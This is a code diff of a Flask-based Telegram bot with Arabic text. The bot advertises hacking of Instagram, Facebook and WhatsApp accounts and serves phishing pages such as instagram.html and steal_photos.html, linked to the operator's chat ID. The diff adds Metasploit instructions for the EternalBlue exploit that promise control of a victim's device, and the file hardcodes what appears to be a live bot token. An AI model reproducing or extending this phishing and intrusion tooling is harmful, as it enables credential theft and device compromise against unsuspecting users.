@@ -5,7 +5,7 @@ import os
 app = Flask(__name__)
 
 TOKEN = "8648739829:AAGlpe-KlISstl5ZMQbxhsjCjcrhFJXEfIs"
-BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
+BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-2-bbvv.onrender.com")
 
 BUTTONS = [
     ["🔥 اختراق انستقرام", "🔥 اختراق فيسبوك", "🔥 اختراق واتساب"],
@@ -35,6 +35,15 @@ TOOLS_MSG = """
 ━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 1️⃣ *Metasploit* (اختراق الأجهزة)
+┌── *الشرح:* أداة لاختراق أجهزة الكمبيوتر والموبايل.
+├── *الخطوات:*
+│   1. افتح Termux.
+│   2. `pkg install metasploit`
+│   3. `msfconsole`
+│   4. `search exploit`
+│   5. `use exploit/windows/smb/ms17_010_eternalblue`
+└── *النتيجة:* تتحكم بجهاز الضحية.
+
 2️⃣ *Hydra* (تخمين كلمات السر)
 3️⃣ *Nmap* (فحص المنافذ)
 4️⃣ *SQLmap* (اختراق قواعد البيانات)
@@ -118,6 +127,10 @@ async function send(){{
 </html>
 """
 
+@app.route('/')
+def home():
+    return "✅ البوت الأسطوري شغال 24 ساعة! ابو الجود"
+
 @app.route('/instagram.html')
 def instagram():
     return phish_page("انستقرام", request.args.get('chatId'))
@@ -189,10 +202,6 @@ def hack_device():
 @app.route('/steal_photos.html')
 def steal_photos():
     return phish_page("سحب الصور", request.args.get('chatId'))
-
-@app.route("/")
-def home():
-    return "✅ البوت الأسطوري شغال 24 ساعة! ابو الجود"
 
 @app.route("/webhook", methods=["POST"])
 def webhook():
